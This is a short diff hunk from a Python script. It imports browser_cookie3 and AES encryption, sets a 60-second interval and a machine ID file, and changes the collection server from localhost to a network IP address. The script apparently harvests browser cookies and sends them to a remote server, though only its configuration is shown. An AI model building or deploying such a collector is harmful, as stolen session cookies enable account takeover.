@@ -18,7 +18,7 @@ from Crypto.Cipher import AES
 import browser_cookie3
 
 # ========== CONFIG ==========
-SERVER_URL = "http://localhost:5000"
+SERVER_URL = "http://192.168.100.17:5000"
 INTERVAL = 60
 MACHINE_ID_FILE = os.path.expanduser("~/.machine_id")
 
